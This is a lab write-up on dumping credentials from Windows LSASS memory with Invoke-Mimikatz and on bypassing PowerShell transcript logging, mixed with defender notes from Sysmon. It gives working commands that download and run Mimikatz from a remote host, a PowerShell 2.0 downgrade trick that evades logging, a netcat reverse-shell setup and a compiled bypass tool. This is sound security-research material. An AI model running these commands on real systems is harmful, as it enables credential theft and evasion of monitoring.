# Dumping Credentials from Lsass Process Memory with Mimikatz

## Dumping Credentials from Lsass Process Memory with Mimikatz

### Execution

{% code title="attacker\@victim" %}
```csharp
powershell IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```
{% endcode %}

Hashes and plain text passwords of the compromised system are dumped to the console:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHe8utRTqLdTrVes4a4%2F-LHeXA6jgVs3puOOxUs1%2Fpwdump-mimikatz-results.png?alt=media\&token=f35fec34-befb-4845-a8cb-57a35bf22859)

### Observations

The process commandline is blatantly showing what is happening in this case, however, you should assume that file names and script argument names will be changed/obfuscated by a sophisticated attacker:

![victim host inspection](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHdq43K0z5zyV6a7HTn%2F-LHe02Tqabb1rPmZyLnl%2Fpwdump-mimikatz.png?alt=media\&token=602ccaac-b8dc-4f1f-b429-c9d5ca515ec6)

As a defender, if your logs show a script being downloaded and executed in memory in a "relatively" short timespan, this should raise your suspicion and the host should be investigated further to make sure it is not compromised:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHe6Orx9v2iIbt9sD3d%2F-LHe6UGqoRiG03fsIQQd%2Fpwdump-mimikatz-sysmon.png?alt=media\&token=264b40cd-bb53-4aa7-896f-fed1231402f9)

#### Transcript Logging #1

PowerShell transcript logging should allow you to see the commands entered into the console and their outputs, however I got some unexpected results at first.

For the first test, I setup transcript logging in my powershell (version 2.0) profile:

{% code title="C:\Users\mantvydas\Documents\WindowsPowerShell\Microsoft.PowerShell:profile.ps1" %}
```bash
Start-Transcript -Path C:\transcript.txt
```
{% endcode %}

{% hint style="warning" %}
Note that enabling transcription logging is not recommended from powershell profiles, since `powershell -nop` will easily bypass this defence - best if logging is enabled via GPOs.
{% endhint %}

#### Cannot Start Transcript

First thing I noticed was that if at least one powershell instance was already running on the victim system, the transcript could not be started (assume because the file is in use already), which makes sense, but is not helpful for the victim at all:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHiTo4rvJW_VgoZTBm3%2F-LHiW3CWTQoKeN-ek2R9%2Fpwdump-transcript-cant-start.png?alt=media\&token=40e5dd5f-d2f5-4eb0-a011-a5c269108cee)

This could be fixed by amending the PS profile so that the the transcript gets saved to a file the OS chooses itself rather than hardcoding it or in other words, doing `Start-Transcript` without specifying the path will do just fine.

#### Empty Transcript - Weird

Below shows three windows stacked - top to bottom:

1. Attacker's console via a netcat reverse shell using cmd.exe, issuing a command to dump credentials with mimikatz powershell script. Note how it says that the transcript was started and the mimikatz output follows;
2. **Empty (!)** transcript logging file transcript.txt on the victim system;
3. Process explorer on the victim system showing the process ancestry of the reverse shell cmd.exe PID `616` which had spawned the powershell process (mentioned in point 1) that ran the mimikatz script;

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHiNtTM_VpFEtKmnE7k%2F-LHiPJC3KgoomstKkIQ_%2Fpwdump-transcript-empty.png?alt=media\&token=37db211e-4324-47ad-8f6f-45cd6c350111)

As can be seen from the above screenshot, the transcript.txt is empty although mimikatz ran successfully and dumped the credentials.\
\
This brings up a question if I am doing something wrong or if this is a limitation of some sort in transcript logging, so I will be trying to:

* dump credentials from a different process ancestry
* dump credentials locally on the victim system (as if I was doing it via RDP)
* upgrade powershell to 5.0+

#### Dumping Credentials Locally

This works as expected and the transcript.txt gets populated with mimikatz output:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHe8utRTqLdTrVes4a4%2F-LHeXo5igSn96a_yV_rn%2Fpwdump-mimikatz-transcript.png?alt=media\&token=356ecbe5-25d5-462a-a496-cad0f5494935)

#### Dumping Credentials From a Different Process Ancestry

Tried dumping creds from the ancestry:\
`powershell > nc > cmd > powershell` instead of `cmd > nc > cmd > powershell` - to no avail.

#### Transcript Logging #2

I have updated my Powershell version from 2.0 to 5.1 and repeated credential dumping remotely `(cmd > nc > cmd > powershell)` process ancestry, same like the first time, where the transcript.txt came back empty. This time, however, the results are different - the output is logged this time:

![Powershell 5.1 transcribing powershell console remotely with no issues](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHjOl_y5rMOn_shj0pJ%2F-LHjPkYieOTACby8ZsR6%2Fpwdump-transcript-working.png?alt=media\&token=064e7cec-9111-4db8-b919-b4152be3c069)

#### Back to PowerShell 2.0

Even though the victim system now has Powershell 5.0 that is capable of transcript logging, we can abuse the `-version 2` switch of the powershell.exe binary like so:

```bash
powershell -version 2 IEX (New-Object System.Net.Webclient).DownloadString('http://10.0.0.5/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```

... and the transcript will again become useless:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHjOl_y5rMOn_shj0pJ%2F-LHjSqNlF7TyLIecUeOP%2Fpwdump-ps2-no-transcript.png?alt=media\&token=3f49feda-1d9f-4213-8d23-ac6927752d8b)

This abuse, however, allows defenders to look for logs showing commandline arguments that suggest powershell is being downgraded and flag them as suspicious activity:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHnaqEaI6O2hsUeShtO%2F-LHnde-VNYmbB09ahKGF%2Fpwdump-powershell-downgrade.png?alt=media\&token=513f8ed2-02c9-4d2b-b957-a7801827c4c7)

#### Bypassing w/o Downgrading

Another technique allowing to bypass the transcript logging without downgrading is possible by using a compiled c# program by [Ben Turner](https://gist.githubusercontent.com/benpturner/d62eb027a518b3743520a34d3aecb915/raw/32d96dafe148c784706b0dc7ed1d0fbbab51c354/posh.cs):

Compile the code .cs code:

```csharp
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:C:\experimemts\transcript-bypass\bypass.exe C:\experiments\transcript-bypass.cs /reference:System.Management.Automation.dll
```

If you are having problems locating the `System.Management.Automation.dll` - you can find its location by using powershell: `PS C:\Users\mantvydas> [psobject].assembly.location`

We can then launch the transcript-bypass and use powershell and not worry about the transcript, because although the file will be created, it will be showing this:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHoUAg2KHUdd-bO0BjC%2F-LHoU4lDDNVibBPGOspm%2Fpwdump-bypass-no-downgrade.png?alt=media\&token=5d57cd5b-5dae-4703-9b5f-cec4fb7d4190)

I wanted to check if I could find any traces of non-powershell.exe processes creating transcript files in the logs, so I updated the sysmon config:

{% code title="sysmonconfig.xml" %}
```markup
<FileCreate onmatch="include">
    <TargetFilename condition="end with">.txt</TargetFilename>
</FileCreate>
```
{% endcode %}

...and while I could see powershell.exe creating transcript files:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHocsiqEs2q9BvpHdlQ%2F-LHoe1_hO0DSYA4ioLQJ%2Fpowershell-transcript-logs.png?alt=media\&token=eee888ec-07db-413b-b05b-a47a4bdc075e)

I could not get sysmon to log the transcript.txt file creation event caused by the `bypass.exe` although the file got successfully created!

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1003" %}

{% embed url="https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html" %}
